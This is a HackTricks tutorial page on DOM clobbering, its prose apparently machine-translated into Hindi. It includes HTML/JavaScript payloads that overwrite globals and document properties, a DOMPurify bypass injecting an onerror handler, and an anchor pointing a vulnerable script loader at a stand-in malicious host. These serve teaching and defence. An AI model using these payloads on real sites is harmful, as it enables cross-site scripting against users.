# Dom Clobbering

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## **‡§¨‡•Å‡§®‡§ø‡§Ø‡§æ‡§¶‡•Ä ‡§¨‡§æ‡§§‡•á‡§Ç**

‡§Ø‡§π **`id`** ‡§î‡§∞ **`name`** ‡§ï‡•á ‡§ó‡•Å‡§£‡•ã‡§Ç ‡§ï‡•á ‡§∏‡§æ‡§• HTML ‡§ü‡•à‡§ó ‡§Æ‡•á‡§Ç **JS ‡§∏‡§Ç‡§¶‡§∞‡•ç‡§≠ ‡§ï‡•á ‡§≠‡•Ä‡§§‡§∞ ‡§µ‡•à‡§∂‡•ç‡§µ‡§ø‡§ï ‡§ö‡§∞ ‡§â‡§§‡•ç‡§™‡§®‡•ç‡§® ‡§ï‡§∞‡§®‡§æ** ‡§∏‡§Ç‡§≠‡§µ ‡§π‡•à‡•§
```html
<form id=x></form>
<script> console.log(typeof document.x) //[object HTMLFormElement] </script>
```
**‡§ï‡•á‡§µ‡§≤** ‡§ï‡•Å‡§õ ‡§§‡§§‡•ç‡§µ **name attribute** ‡§ï‡§æ ‡§â‡§™‡§Ø‡•ã‡§ó ‡§ï‡§∞‡§ï‡•á ‡§ó‡•ç‡§≤‡•ã‡§¨‡§≤‡•ç‡§∏ ‡§ï‡•ã ‡§ï‡•ç‡§≤‡•â‡§¨‡§∞ ‡§ï‡§∞ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç, ‡§µ‡•á ‡§π‡•à‡§Ç: `embed`, `form`, `iframe`, `image`, `img` ‡§î‡§∞ `object`‡•§

‡§¶‡§ø‡§≤‡§ö‡§∏‡•ç‡§™ ‡§¨‡§æ‡§§ ‡§Ø‡§π ‡§π‡•à ‡§ï‡§ø ‡§ú‡§¨ ‡§Ü‡§™ ‡§è‡§ï **form element** ‡§ï‡§æ ‡§â‡§™‡§Ø‡•ã‡§ó ‡§ï‡§∞‡§ï‡•á ‡§è‡§ï ‡§µ‡•á‡§∞‡§ø‡§è‡§¨‡§≤ ‡§ï‡•ã **clobber** ‡§ï‡§∞‡§§‡•á ‡§π‡•à‡§Ç, ‡§§‡•ã ‡§Ü‡§™‡§ï‡•ã ‡§§‡§§‡•ç‡§µ ‡§ï‡§æ **`toString`** ‡§Æ‡§æ‡§® ‡§Æ‡§ø‡§≤‡•á‡§ó‡§æ: `[object HTMLFormElement]` ‡§≤‡•á‡§ï‡§ø‡§® **anchor** ‡§ï‡•á ‡§∏‡§æ‡§• **`toString`** ‡§è‡§Ç‡§ï‡§∞ ‡§ï‡§æ **`href`** ‡§π‡•ã‡§ó‡§æ‡•§ ‡§á‡§∏‡§≤‡§ø‡§è, ‡§Ø‡§¶‡§ø ‡§Ü‡§™ **`a`** ‡§ü‡•à‡§ó ‡§ï‡§æ ‡§â‡§™‡§Ø‡•ã‡§ó ‡§ï‡§∞‡§ï‡•á ‡§ï‡•ç‡§≤‡•â‡§¨‡§∞ ‡§ï‡§∞‡§§‡•á ‡§π‡•à‡§Ç, ‡§§‡•ã ‡§Ü‡§™ **string** ‡§ï‡•á ‡§∞‡•Ç‡§™ ‡§Æ‡•á‡§Ç **‡§µ‡•ç‡§Ø‡§µ‡§π‡§æ‡§∞** ‡§ï‡§∞‡§§‡•á ‡§∏‡§Æ‡§Ø **value** ‡§ï‡•ã **control** ‡§ï‡§∞ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç:
```html
<a href="controlled string" id=x></a>
<script>
console.log(x);//controlled string
</script>
```
### Arrays & Attributes

‡§Ø‡§π **‡§è‡§ï ‡§è‡§∞‡•á** ‡§î‡§∞ **‡§ë‡§¨‡•ç‡§ú‡•á‡§ï‡•ç‡§ü ‡§µ‡§ø‡§∂‡•á‡§∑‡§§‡§æ‡§ì‡§Ç** ‡§ï‡•ã **‡§ï‡•ç‡§≤‡•â‡§¨‡§∞** ‡§ï‡§∞‡§®‡§æ ‡§≠‡•Ä ‡§∏‡§Ç‡§≠‡§µ ‡§π‡•à:
```html
<a id=x>
<a id=x name=y href=controlled>
<script>
console.log(x[1])//controlled
console.log(x.y)//controlled
</script>
```
**‡§è‡§ï 3rd ‡§µ‡§ø‡§∂‡•á‡§∑‡§§‡§æ** (‡§ú‡•à‡§∏‡•á x.y.z) ‡§ï‡•ã ‡§ï‡•ç‡§≤‡•â‡§¨‡§∞ ‡§ï‡§∞‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è, ‡§Ü‡§™‡§ï‡•ã ‡§è‡§ï **`form`** ‡§ï‡§æ ‡§â‡§™‡§Ø‡•ã‡§ó ‡§ï‡§∞‡§®‡•á ‡§ï‡•Ä ‡§Ü‡§µ‡§∂‡•ç‡§Ø‡§ï‡§§‡§æ ‡§π‡•à:
```html
<form id=x name=y><input id=z value=controlled></form>
<form id=x></form>
<script>
alert(x.y.z.value)//controlled
</script>
```
Clobbering ‡§Ö‡§ß‡§ø‡§ï ‡§µ‡§ø‡§∂‡•á‡§∑‡§§‡§æ‡§ì‡§Ç ‡§ï‡•ã **‡§Ö‡§ß‡§ø‡§ï ‡§ú‡§ü‡§ø‡§≤ ‡§π‡•à ‡§≤‡•á‡§ï‡§ø‡§® ‡§´‡§ø‡§∞ ‡§≠‡•Ä ‡§∏‡§Ç‡§≠‡§µ ‡§π‡•à**, iframes ‡§ï‡§æ ‡§â‡§™‡§Ø‡•ã‡§ó ‡§ï‡§∞‡§ï‡•á:
```html
<iframe name=x srcdoc="<a id=y href=controlled></a>"></iframe>
<style>@import 'https://google.com';</style>
<script>alert(x.y)//controlled</script>
```
{% hint style="warning" %}
‡§∏‡•ç‡§ü‡§æ‡§á‡§≤ ‡§ü‡•à‡§ó ‡§ï‡§æ ‡§â‡§™‡§Ø‡•ã‡§ó **iframes ‡§ï‡•ã ‡§∞‡•á‡§Ç‡§°‡§∞ ‡§ï‡§∞‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è ‡§™‡§∞‡•ç‡§Ø‡§æ‡§™‡•ç‡§§ ‡§∏‡§Æ‡§Ø ‡§¶‡•á‡§®‡•á** ‡§ï‡•á ‡§≤‡§ø‡§è ‡§ï‡§ø‡§Ø‡§æ ‡§ú‡§æ‡§§‡§æ ‡§π‡•à‡•§ ‡§á‡§∏‡§ï‡•á ‡§¨‡§ø‡§®‡§æ ‡§Ü‡§™‡§ï‡•ã **undefined** ‡§ï‡§æ ‡§Ö‡§≤‡§∞‡•ç‡§ü ‡§Æ‡§ø‡§≤‡•á‡§ó‡§æ‡•§
{% endhint %}

‡§ó‡§π‡§∞‡•á ‡§ó‡•Å‡§£‡•ã‡§Ç ‡§ï‡•ã ‡§ï‡•ç‡§≤‡•â‡§¨‡§∞ ‡§ï‡§∞‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è, ‡§Ü‡§™ **html ‡§è‡§®‡•ç‡§ï‡•ã‡§°‡§ø‡§Ç‡§ó ‡§ï‡•á ‡§∏‡§æ‡§• iframes** ‡§ï‡§æ ‡§â‡§™‡§Ø‡•ã‡§ó ‡§á‡§∏ ‡§§‡§∞‡§π ‡§ï‡§∞ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç:
```html
<iframe name=a srcdoc="<iframe srcdoc='<iframe name=c srcdoc=<a/id=d&amp;amp;#x20;name=e&amp;amp;#x20;href=\controlled&amp;amp;gt;<a&amp;amp;#x20;id=d&amp;amp;gt; name=d>' name=b>"></iframe>
<style>@import 'https://google.com';</style>
<script>
alert(a.b.c.d.e)//controlled
</script>
```
### **‡§´‡§ø‡§≤‡•ç‡§ü‡§∞ ‡§¨‡§æ‡§Ø‡§™‡§æ‡§∏‡§ø‡§Ç‡§ó**

‡§Ø‡§¶‡§ø ‡§è‡§ï ‡§´‡§º‡§ø‡§≤‡•ç‡§ü‡§∞ ‡§ï‡§ø‡§∏‡•Ä ‡§®‡•ã‡§° ‡§ï‡•á **‡§ó‡•Å‡§£‡•ã‡§Ç** ‡§ï‡•á ‡§Æ‡§æ‡§ß‡•ç‡§Ø‡§Æ ‡§∏‡•á **‡§≤‡•Ç‡§™‡§ø‡§Ç‡§ó** ‡§ï‡§∞ ‡§∞‡§π‡§æ ‡§π‡•à ‡§ú‡•à‡§∏‡•á ‡§ï‡§ø `document.getElementByID('x').attributes` ‡§§‡•ã ‡§Ü‡§™ **`.attributes`** ‡§ó‡•Å‡§£ ‡§ï‡•ã **‡§ï‡•ç‡§≤‡•â‡§¨‡§∞** ‡§ï‡§∞ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç ‡§î‡§∞ **‡§´‡§º‡§ø‡§≤‡•ç‡§ü‡§∞** ‡§ï‡•ã **‡§ü‡•Ç‡§ü** ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç‡•§ ‡§Ö‡§®‡•ç‡§Ø DOM ‡§ó‡•Å‡§£ ‡§ú‡•à‡§∏‡•á **`tagName`**, **`nodeName`** ‡§Ø‡§æ **`parentNode`** ‡§î‡§∞ ‡§≠‡•Ä **‡§ï‡•ç‡§≤‡•â‡§¨‡§∞ ‡§ï‡§∞‡§®‡•á ‡§Ø‡•ã‡§ó‡•ç‡§Ø** ‡§π‡•à‡§Ç‡•§
```html
<form id=x></form>
<form id=y>
<input name=nodeName>
</form>
<script>
console.log(document.getElementById('x').nodeName)//FORM
console.log(document.getElementById('y').nodeName)//[object HTMLInputElement]
</script>
```
## **Clobbering `window.someObject`**

JavaScript ‡§Æ‡•á‡§Ç ‡§Ø‡§π ‡§∏‡§æ‡§Æ‡§æ‡§®‡•ç‡§Ø ‡§π‡•à ‡§ï‡§ø:
```javascript
var someObject = window.someObject || {};
```
‡§™‡•É‡§∑‡•ç‡§† ‡§™‡§∞ HTML ‡§ï‡•ã ‡§∏‡§Ç‡§∂‡•ã‡§ß‡§ø‡§§ ‡§ï‡§∞‡§®‡§æ `someObject` ‡§ï‡•ã ‡§è‡§ï DOM ‡§®‡•ã‡§° ‡§ï‡•á ‡§∏‡§æ‡§• ‡§ì‡§µ‡§∞‡§∞‡§æ‡§á‡§° ‡§ï‡§∞‡§®‡•á ‡§ï‡•Ä ‡§Ö‡§®‡•Å‡§Æ‡§§‡§ø ‡§¶‡•á‡§§‡§æ ‡§π‡•à, ‡§ú‡•ã ‡§∏‡§Ç‡§≠‡§æ‡§µ‡§ø‡§§ ‡§∞‡•Ç‡§™ ‡§∏‡•á ‡§∏‡•Å‡§∞‡§ï‡•ç‡§∑‡§æ ‡§ï‡§Æ‡§ú‡•ã‡§∞‡§ø‡§Ø‡•ã‡§Ç ‡§ï‡•ã ‡§™‡•á‡§∂ ‡§ï‡§∞ ‡§∏‡§ï‡§§‡§æ ‡§π‡•à‡•§ ‡§â‡§¶‡§æ‡§π‡§∞‡§£ ‡§ï‡•á ‡§≤‡§ø‡§è, ‡§Ü‡§™ `someObject` ‡§ï‡•ã ‡§è‡§ï ‡§è‡§Ç‡§ï‡§∞ ‡§§‡§§‡•ç‡§µ ‡§ï‡•á ‡§∏‡§æ‡§• ‡§¨‡§¶‡§≤ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç ‡§ú‡•ã ‡§è‡§ï ‡§¶‡•Å‡§∞‡•ç‡§≠‡§æ‡§µ‡§®‡§æ‡§™‡•Ç‡§∞‡•ç‡§£ ‡§∏‡•ç‡§ï‡•ç‡§∞‡§ø‡§™‡•ç‡§ü ‡§ï‡•Ä ‡§ì‡§∞ ‡§á‡§∂‡§æ‡§∞‡§æ ‡§ï‡§∞‡§§‡§æ ‡§π‡•à:
```html
<a id=someObject href=//malicious-website.com/malicious.js></a>
```
‡§è‡§ï ‡§ï‡§Æ‡§ú‡•ã‡§∞ ‡§ï‡•ã‡§° ‡§ú‡•à‡§∏‡•á:
```html
<script>
window.onload = function(){
let someObject = window.someObject || {};
let script = document.createElement('script');
script.src = someObject.url;
document.body.appendChild(script);
};
</script>
```
‡§Ø‡§π ‡§µ‡§ø‡§ß‡§ø ‡§∏‡•ç‡§ï‡•ç‡§∞‡§ø‡§™‡•ç‡§ü ‡§∏‡•ç‡§∞‡•ã‡§§ ‡§ï‡§æ ‡§â‡§™‡§Ø‡•ã‡§ó ‡§ï‡§∞‡§ï‡•á ‡§Ö‡§µ‡§æ‡§Ç‡§õ‡§ø‡§§ ‡§ï‡•ã‡§° ‡§®‡§ø‡§∑‡•ç‡§™‡§æ‡§¶‡§ø‡§§ ‡§ï‡§∞‡§§‡•Ä ‡§π‡•à‡•§

**‡§ü‡•ç‡§∞‡§ø‡§ï**: **`DOMPurify`** ‡§Ü‡§™‡§ï‡•ã **`cid:`** ‡§™‡•ç‡§∞‡•ã‡§ü‡•ã‡§ï‡•â‡§≤ ‡§ï‡§æ ‡§â‡§™‡§Ø‡•ã‡§ó ‡§ï‡§∞‡§®‡•á ‡§ï‡•Ä ‡§Ö‡§®‡•Å‡§Æ‡§§‡§ø ‡§¶‡•á‡§§‡§æ ‡§π‡•à, ‡§ú‡•ã **‡§°‡§¨‡§≤-‡§ï‡•ã‡§ü‡•ç‡§∏ ‡§ï‡•ã URL-‡§è‡§®‡•ç‡§ï‡•ã‡§° ‡§®‡§π‡•Ä‡§Ç ‡§ï‡§∞‡§§‡§æ**‡•§ ‡§á‡§∏‡§ï‡§æ ‡§Æ‡§§‡§≤‡§¨ ‡§π‡•à ‡§ï‡§ø ‡§Ü‡§™ **‡§è‡§ï ‡§è‡§®‡•ç‡§ï‡•ã‡§°‡•á‡§° ‡§°‡§¨‡§≤-‡§ï‡•ã‡§ü‡•ç‡§∏ ‡§á‡§Ç‡§ú‡•á‡§ï‡•ç‡§ü ‡§ï‡§∞ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç ‡§ú‡•ã ‡§∞‡§®‡§ü‡§æ‡§á‡§Æ ‡§™‡§∞ ‡§°‡§ø‡§ï‡•ã‡§° ‡§π‡•ã‡§ó‡§æ**‡•§ ‡§á‡§∏‡§≤‡§ø‡§è, ‡§ï‡•Å‡§õ ‡§á‡§∏ ‡§§‡§∞‡§π ‡§á‡§Ç‡§ú‡•á‡§ï‡•ç‡§ü ‡§ï‡§∞‡§®‡§æ **`<a id=defaultAvatar><a id=defaultAvatar name=avatar href="cid:&quot;onerror=alert(1)//">`** HTML ‡§è‡§®‡•ç‡§ï‡•ã‡§°‡•á‡§° `&quot;` ‡§ï‡•ã **‡§∞‡§®‡§ü‡§æ‡§á‡§Æ ‡§™‡§∞ ‡§°‡§ø‡§ï‡•ã‡§°** ‡§ï‡§∞‡•á‡§ó‡§æ ‡§î‡§∞ **‡§è‡§ü‡•ç‡§∞‡§ø‡§¨‡•ç‡§Ø‡•Ç‡§ü ‡§µ‡•à‡§≤‡•ç‡§Ø‡•Ç ‡§∏‡•á ‡§¨‡§æ‡§π‡§∞ ‡§®‡§ø‡§ï‡§≤‡§®‡•á** ‡§ï‡•á ‡§≤‡§ø‡§è **`onerror`** ‡§á‡§µ‡•á‡§Ç‡§ü **‡§¨‡§®‡§æ‡§è‡§ó‡§æ**‡•§

‡§è‡§ï ‡§Ö‡§®‡•ç‡§Ø ‡§§‡§ï‡§®‡•Ä‡§ï **`form`** ‡§§‡§§‡•ç‡§µ ‡§ï‡§æ ‡§â‡§™‡§Ø‡•ã‡§ó ‡§ï‡§∞‡§§‡•Ä ‡§π‡•à‡•§ ‡§ï‡•Å‡§õ ‡§ï‡•ç‡§≤‡§æ‡§á‡§Ç‡§ü-‡§∏‡§æ‡§á‡§° ‡§™‡•Å‡§∏‡•ç‡§§‡§ï‡§æ‡§≤‡§Ø ‡§®‡§è ‡§¨‡§®‡§æ‡§è ‡§ó‡§è ‡§´‡•â‡§∞‡•ç‡§Æ ‡§§‡§§‡•ç‡§µ ‡§ï‡•á ‡§è‡§ü‡•ç‡§∞‡§ø‡§¨‡•ç‡§Ø‡•Ç‡§ü‡•ç‡§∏ ‡§ï‡•Ä ‡§ú‡§æ‡§Ç‡§ö ‡§ï‡§∞‡§§‡•á ‡§π‡•à‡§Ç ‡§§‡§æ‡§ï‡§ø ‡§â‡§®‡•ç‡§π‡•á‡§Ç ‡§∏‡§æ‡§´ ‡§ï‡§ø‡§Ø‡§æ ‡§ú‡§æ ‡§∏‡§ï‡•á‡•§ ‡§π‡§æ‡§≤‡§æ‡§Å‡§ï‡§ø, ‡§´‡•â‡§∞‡•ç‡§Æ ‡§ï‡•á ‡§Ö‡§Ç‡§¶‡§∞ `id=attributes` ‡§ï‡•á ‡§∏‡§æ‡§• ‡§è‡§ï `input` ‡§ú‡•ã‡§°‡§º‡§ï‡§∞, ‡§Ü‡§™ ‡§™‡•ç‡§∞‡§≠‡§æ‡§µ‡•Ä ‡§∞‡•Ç‡§™ ‡§∏‡•á ‡§è‡§ü‡•ç‡§∞‡§ø‡§¨‡•ç‡§Ø‡•Ç‡§ü‡•ç‡§∏ ‡§™‡•ç‡§∞‡•â‡§™‡§∞‡•ç‡§ü‡•Ä ‡§ï‡•ã ‡§ì‡§µ‡§∞‡§∞‡§æ‡§á‡§ü ‡§ï‡§∞ ‡§¶‡•á‡§§‡•á ‡§π‡•à‡§Ç, ‡§ú‡§ø‡§∏‡§∏‡•á ‡§∏‡•á‡§®‡§ø‡§ü‡§æ‡§á‡§ú‡§º‡§∞ ‡§ï‡•ã ‡§µ‡§æ‡§∏‡•ç‡§§‡§µ‡§ø‡§ï ‡§è‡§ü‡•ç‡§∞‡§ø‡§¨‡•ç‡§Ø‡•Ç‡§ü‡•ç‡§∏ ‡§§‡§ï ‡§™‡§π‡•Å‡§Å‡§ö‡§®‡•á ‡§∏‡•á ‡§∞‡•ã‡§ï‡§æ ‡§ú‡§æ ‡§∏‡§ï‡§§‡§æ ‡§π‡•à‡•§

‡§Ü‡§™ [**‡§á‡§∏ ‡§™‡•ç‡§∞‡§ï‡§æ‡§∞ ‡§ï‡•á ‡§ï‡•ç‡§≤‡•â‡§¨‡§∞‡§ø‡§Ç‡§ó ‡§ï‡§æ ‡§è‡§ï ‡§â‡§¶‡§æ‡§π‡§∞‡§£ ‡§á‡§∏ CTF ‡§≤‡•á‡§ñ ‡§Æ‡•á‡§Ç ‡§™‡§æ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç**](iframes-in-xss-and-csp.md#iframes-in-sop-2)‡•§

## ‡§ï‡•ç‡§≤‡•â‡§¨‡§∞‡§ø‡§Ç‡§ó ‡§¶‡§∏‡•ç‡§§‡§æ‡§µ‡•á‡§ú‡§º ‡§ë‡§¨‡•ç‡§ú‡•á‡§ï‡•ç‡§ü

‡§¶‡§∏‡•ç‡§§‡§æ‡§µ‡•á‡§ú‡§º ‡§ï‡•á ‡§Ö‡§®‡•Å‡§∏‡§æ‡§∞, DOM ‡§ï‡•ç‡§≤‡•â‡§¨‡§∞‡§ø‡§Ç‡§ó ‡§ï‡§æ ‡§â‡§™‡§Ø‡•ã‡§ó ‡§ï‡§∞‡§ï‡•á ‡§¶‡§∏‡•ç‡§§‡§æ‡§µ‡•á‡§ú‡§º ‡§ë‡§¨‡•ç‡§ú‡•á‡§ï‡•ç‡§ü ‡§ï‡•á ‡§è‡§ü‡•ç‡§∞‡§ø‡§¨‡•ç‡§Ø‡•Ç‡§ü‡•ç‡§∏ ‡§ï‡•ã ‡§ì‡§µ‡§∞‡§∞‡§æ‡§á‡§ü ‡§ï‡§∞‡§®‡§æ ‡§∏‡§Ç‡§≠‡§µ ‡§π‡•à:

> [Document](https://html.spec.whatwg.org/multipage/dom.html#document) ‡§á‡§Ç‡§ü‡§∞‡§´‡•á‡§∏ [named properties](https://webidl.spec.whatwg.org/#dfn-support-named-properties) ‡§ï‡§æ ‡§∏‡§Æ‡§∞‡•ç‡§•‡§® ‡§ï‡§∞‡§§‡§æ ‡§π‡•à‡•§ [Document](https://html.spec.whatwg.org/multipage/dom.html#document) ‡§ë‡§¨‡•ç‡§ú‡•á‡§ï‡•ç‡§ü ‡§¶‡§∏‡•ç‡§§‡§æ‡§µ‡•á‡§ú‡§º ‡§ï‡•á [supported property names](https://webidl.spec.whatwg.org/#dfn-supported-property-names) ‡§Æ‡•á‡§Ç ‡§ï‡§ø‡§∏‡•Ä ‡§≠‡•Ä ‡§ï‡•ç‡§∑‡§£ ‡§®‡§ø‡§Æ‡•ç‡§®‡§≤‡§ø‡§ñ‡§ø‡§§ ‡§π‡•ã‡§§‡•á ‡§π‡•à‡§Ç, [tree order](https://dom.spec.whatwg.org/#concept-tree-order) ‡§ï‡•á ‡§Ö‡§®‡•Å‡§∏‡§æ‡§∞ ‡§ú‡•ã ‡§§‡§§‡•ç‡§µ ‡§â‡§®‡•ç‡§π‡•á‡§Ç ‡§Ø‡•ã‡§ó‡§¶‡§æ‡§® ‡§¶‡•á‡§§‡§æ ‡§π‡•à, ‡§¨‡§æ‡§¶ ‡§ï‡•Ä ‡§°‡•Å‡§™‡•ç‡§≤‡§ø‡§ï‡•á‡§ü‡•ç‡§∏ ‡§ï‡•ã ‡§®‡§ú‡§∞‡§Ö‡§Ç‡§¶‡§æ‡§ú ‡§ï‡§∞‡§§‡•á ‡§π‡•Å‡§è, ‡§î‡§∞ ‡§ú‡§¨ ‡§è‡§ï ‡§π‡•Ä ‡§§‡§§‡•ç‡§µ ‡§¶‡•ã‡§®‡•ã‡§Ç ‡§ï‡§æ ‡§Ø‡•ã‡§ó‡§¶‡§æ‡§® ‡§¶‡•á‡§§‡§æ ‡§π‡•à ‡§§‡•ã [id](https://html.spec.whatwg.org/multipage/dom.html#the-id-attribute) ‡§è‡§ü‡•ç‡§∞‡§ø‡§¨‡•ç‡§Ø‡•Ç‡§ü‡•ç‡§∏ ‡§∏‡•á ‡§Æ‡§æ‡§® ‡§™‡§π‡§≤‡•á ‡§Ü‡§§‡•á ‡§π‡•à‡§Ç:
>
> \- ‡§∏‡§≠‡•Ä [exposed](https://html.spec.whatwg.org/multipage/dom.html#exposed) [embed](https://html.spec.whatwg.org/multipage/iframe-embed-object.html#the-embed-element), [form](https://html.spec.whatwg.org/multipage/forms.html#the-form-element), [iframe](https://html.spec.whatwg.org/multipage/iframe-embed-object.html#the-iframe-element), [img](https://html.spec.whatwg.org/multipage/embedded-content.html#the-img-element), ‡§î‡§∞ [exposed](https://html.spec.whatwg.org/multipage/dom.html#exposed) [object](https://html.spec.whatwg.org/multipage/iframe-embed-object.html#the-object-element) ‡§§‡§§‡•ç‡§µ‡•ã‡§Ç ‡§ï‡•á ‡§≤‡§ø‡§è ‡§®‡§æ‡§Æ ‡§∏‡§æ‡§Æ‡§ó‡•ç‡§∞‡•Ä ‡§è‡§ü‡•ç‡§∞‡§ø‡§¨‡•ç‡§Ø‡•Ç‡§ü ‡§ï‡§æ ‡§Æ‡§æ‡§® ‡§ú‡•ã ‡§è‡§ï ‡§ó‡•à‡§∞-‡§ñ‡§æ‡§≤‡•Ä ‡§®‡§æ‡§Æ ‡§∏‡§æ‡§Æ‡§ó‡•ç‡§∞‡•Ä ‡§è‡§ü‡•ç‡§∞‡§ø‡§¨‡•ç‡§Ø‡•Ç‡§ü ‡§π‡•à ‡§î‡§∞ [in a document tree](https://dom.spec.whatwg.org/#in-a-document-tree) ‡§Æ‡•á‡§Ç ‡§π‡•à ‡§ú‡§ø‡§∏‡§Æ‡•á‡§Ç ‡§¶‡§∏‡•ç‡§§‡§æ‡§µ‡•á‡§ú‡§º ‡§â‡§®‡§ï‡•á [root](https://dom.spec.whatwg.org/#concept-tree-root) ‡§ï‡•á ‡§∞‡•Ç‡§™ ‡§Æ‡•á‡§Ç ‡§π‡•à;\
> \
> \- ‡§∏‡§≠‡•Ä [exposed](https://html.spec.whatwg.org/multipage/dom.html#exposed) [object](https://html.spec.whatwg.org/multipage/iframe-embed-object.html#the-object-element) ‡§§‡§§‡•ç‡§µ‡•ã‡§Ç ‡§ï‡•á ‡§≤‡§ø‡§è [id](https://html.spec.whatwg.org/multipage/dom.html#the-id-attribute) ‡§∏‡§æ‡§Æ‡§ó‡•ç‡§∞‡•Ä ‡§è‡§ü‡•ç‡§∞‡§ø‡§¨‡•ç‡§Ø‡•Ç‡§ü ‡§ï‡§æ ‡§Æ‡§æ‡§® ‡§ú‡•ã ‡§è‡§ï ‡§ó‡•à‡§∞-‡§ñ‡§æ‡§≤‡•Ä [id](https://html.spec.whatwg.org/multipage/dom.html#the-id-attribute) ‡§∏‡§æ‡§Æ‡§ó‡•ç‡§∞‡•Ä ‡§è‡§ü‡•ç‡§∞‡§ø‡§¨‡•ç‡§Ø‡•Ç‡§ü ‡§π‡•à ‡§î‡§∞ [in a document tree](https://dom.spec.whatwg.org/#in-a-document-tree) ‡§Æ‡•á‡§Ç ‡§π‡•à ‡§ú‡§ø‡§∏‡§Æ‡•á‡§Ç ‡§¶‡§∏‡•ç‡§§‡§æ‡§µ‡•á‡§ú‡§º ‡§â‡§®‡§ï‡•á [root](https://dom.spec.whatwg.org/#concept-tree-root) ‡§ï‡•á ‡§∞‡•Ç‡§™ ‡§Æ‡•á‡§Ç ‡§π‡•à;\
> \
> \- ‡§∏‡§≠‡•Ä [img](https://html.spec.whatwg.org/multipage/embedded-content.html#the-img-element) ‡§§‡§§‡•ç‡§µ‡•ã‡§Ç ‡§ï‡•á ‡§≤‡§ø‡§è [id](https://html.spec.whatwg.org/multipage/dom.html#the-id-attribute) ‡§∏‡§æ‡§Æ‡§ó‡•ç‡§∞‡•Ä ‡§è‡§ü‡•ç‡§∞‡§ø‡§¨‡•ç‡§Ø‡•Ç‡§ü ‡§ï‡§æ ‡§Æ‡§æ‡§® ‡§ú‡•ã ‡§è‡§ï ‡§ó‡•à‡§∞-‡§ñ‡§æ‡§≤‡•Ä [id](https://html.spec.whatwg.org/multipage/dom.html#the-id-attribute) ‡§∏‡§æ‡§Æ‡§ó‡•ç‡§∞‡•Ä ‡§è‡§ü‡•ç‡§∞‡§ø‡§¨‡•ç‡§Ø‡•Ç‡§ü ‡§î‡§∞ ‡§è‡§ï ‡§ó‡•à‡§∞-‡§ñ‡§æ‡§≤‡•Ä ‡§®‡§æ‡§Æ ‡§∏‡§æ‡§Æ‡§ó‡•ç‡§∞‡•Ä ‡§è‡§ü‡•ç‡§∞‡§ø‡§¨‡•ç‡§Ø‡•Ç‡§ü ‡§¶‡•ã‡§®‡•ã‡§Ç ‡§π‡•à‡§Ç, ‡§î‡§∞ [in a document tree](https://dom.spec.whatwg.org/#in-a-document-tree) ‡§Æ‡•á‡§Ç ‡§π‡•à‡§Ç ‡§ú‡§ø‡§∏‡§Æ‡•á‡§Ç ‡§¶‡§∏‡•ç‡§§‡§æ‡§µ‡•á‡§ú‡§º ‡§â‡§®‡§ï‡•á [root](https://dom.spec.whatwg.org/#concept-tree-root) ‡§ï‡•á ‡§∞‡•Ç‡§™ ‡§Æ‡•á‡§Ç ‡§π‡•à‡•§

‡§á‡§∏ ‡§§‡§ï‡§®‡•Ä‡§ï ‡§ï‡§æ ‡§â‡§™‡§Ø‡•ã‡§ó ‡§ï‡§∞‡§ï‡•á ‡§Ü‡§™ ‡§∏‡§æ‡§Æ‡§æ‡§®‡•ç‡§Ø‡§§‡§É ‡§â‡§™‡§Ø‡•ã‡§ó ‡§ï‡§ø‡§è ‡§ú‡§æ‡§®‡•á ‡§µ‡§æ‡§≤‡•á **‡§Æ‡§æ‡§® ‡§ú‡•à‡§∏‡•á `document.cookie`, `document.body`, `document.children`**, ‡§î‡§∞ ‡§Ø‡§π‡§æ‡§Ç ‡§§‡§ï ‡§ï‡§ø ‡§¶‡§∏‡•ç‡§§‡§æ‡§µ‡•á‡§ú‡§º ‡§á‡§Ç‡§ü‡§∞‡§´‡•á‡§∏ ‡§Æ‡•á‡§Ç ‡§µ‡§ø‡§ß‡§ø‡§Ø‡•ã‡§Ç ‡§ï‡•ã ‡§ú‡•à‡§∏‡•á `document.querySelector` ‡§ï‡•ã ‡§ì‡§µ‡§∞‡§∞‡§æ‡§á‡§ü ‡§ï‡§∞ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç‡•§
```javascript
document.write("<img name=cookie />")

document.cookie
<img name="cookie">

typeof(document.cookie)
'object'

//Something more sanitize friendly than a img tag
document.write("<form name=cookie><input id=toString></form>")

document.cookie
HTMLCollection(2)¬†[img, form, cookie: img]

typeof(document.cookie)
'object
```
## Writing after the element clobbered

